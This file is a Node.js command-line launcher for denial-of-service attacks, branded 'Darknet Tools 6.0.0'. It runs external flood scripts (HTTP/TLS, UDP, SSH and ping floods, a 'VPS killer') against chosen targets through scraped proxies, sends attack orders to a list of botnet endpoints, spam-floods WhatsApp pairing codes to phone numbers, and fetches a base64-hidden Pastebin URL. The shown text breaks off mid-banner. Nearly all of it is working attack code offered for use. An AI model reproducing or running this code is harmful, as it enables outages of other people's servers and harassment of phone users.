#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = 'requeire(cheros)'
const TelegramBot = require('node-telegram-bot-api');
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀   Owner : V3 And Joseph
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀   Premium : True
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀   Time Limit : 9999999
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀     Jika Ada Eror Segera Lapor Atmin
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀  
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`);
    console.log(`|| ▓▓░░░░░░░░ || 20%`);

    const encodedURL = 'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0R2VWZtazBS';
    const decodedURL = Buffer.from(encodedURL, 'base64').toString('utf8');
    const getLatestcheros = await fetch(decodedURL);

    const latestVersion = await getLatestcheros.text();
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);

    if (version === latestVersion.trim()) {
      console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
      await scrapeProxy();
      console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`);
      await scrapeUserAgent();
      console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`);
      await sleep(700);
      console.clear();
      console.log(`Welcome To Darknet Tools 6.0.0`);
      await sleep(1000);
      await banner();
      console.log(`Type "help" For Showing All Available Commands`);
      sigma();
    } else {
      console.log(`Error => ${latestVersion.trim()}`);
      await exec(`npm uninstall -g prmnmd-tuls`);
      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Restart Tools Please`);
      process.exit();
    }
  } catch (error) {
    console.log(`Are You Online?`);
  }
}
// ====== //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: tls <target>  <port> <duration>
tls https://google.com 433 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                      Attack Has Been Launched
========================================================================
Status   : \x1b[38;5;160mAttack Has Successfull Launched\x1b[0m
Target   : ${target}
Duration : ${duration}
Methods  : ${methods}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
	sigma()
 } else if (methods === 'httpx') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 9 3 proxy.txt`)
          sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'bypass') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
      sigma()
      } else if (methods === 'bomb') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
        sigma()
        } else if (methods === 'black') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
          sigma()
          } else if (methods === 'crot') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'pluto') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'harder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
          sigma()
         } else if (methods === 'hitam') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
          } else if (methods === 'tlsv2') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
          sigma()
          } else if (methods === 'mixed') {
       pushOngoing(target, methods, duration)
const glory = path.join(__dirname, `/lib/cache/glory`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const harder = path.join(__dirname, `/lib/cache/harder`);
        exec(`node ${glory} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${harder} ${target} ${duration} 32 8 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
function methods() {
    
    const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));

    console.log(`                          Methods`);
    console.log(` NAME      │ DESCRIPTION                    │ DURATION`);
    console.log(`───────────┼────────────────────────────────┼──────────`);

    methodsData.forEach(method => {
        console.log(
            `${method.name.padEnd(10)} │ ${method.description.padEnd(30)} │ ${method.duration.padEnd(3)}`
        );
    });
}

// Logika untuk menjalankan perintah
const command = process.argv[2]; 
// ===========================================//
async function Botnethitam(args) {
    if (args.length < 3) {
    console.log(`Example: botnet <target> <duration> <methods>
botnet https://google.com 120 flood`);
    sigma();
	return
}
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                      Attack Has Been Launched
========================================================================Target Detail
 - Target   : [ ${target} ]
 - Isp      : [ ${result.isp} ]
 - Ip       : [ ${result.query} ]
 - As      : [ ${result.as} ]
Attack Detail
 - Status   : [ Attack Succses ]
 - Botnet  : [ ${successCount} ]
 - Duration : [ ${duration} ]
 - Methods  : [ ${methods} ]
`);
    sigma()
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
// [========================================] //
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: add-server <endpoints>
add-botnet http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}
// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=test&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
    sigma()
}
// [========================================] //
async function SpamPair(args) {
  if (args.length < 2) {
    console.log(`Example: pairing <target> <duration> 
pairing 6281111111111 500`);
    sigma();
	return
  }
const [targetNumber, spamAmount] = args
try {

console.log(`Attack Detail
 - Target   : [ ${targetNumber} ]
 - Duration : [ ${spamAmount} ]
 - Methods  : [ Spam Pairing Code ]
`)
} catch (error) {
  console.log(`Error`)
}

const metode = path.join(__dirname, `/lib/cache/17`);
exec(`node ${metode} ${targetNumber} ${spamAmount}`)
sigma()
};
// [========================================] //
async function pod(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ping <target> <duration>
kill-ping 123.456.789.10 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.log(`Target Detail
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m kill-ping \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/18`);
exec(`node ${metode} ${target} 66507 6 1 ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    VPS Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : V3 And Joseph`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/14`);
const ninja = path.join(__dirname, `/lib/cache/3`);
const ssh = path.join(__dirname, `/lib/cache/19`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${ninja} http://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    UDP Raw Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : V3 And Joseph`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/20`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function flood(args) {
  if (args.length < 3) {
    console.log(`Example: .flood <target> <port> <duration>
flood https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
	const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

========================================================================
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m flood \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/2`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function tls(args) {
  if (args.length < 3) {
    console.log(`Example: .tls <target> <port> <duration>
tls https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
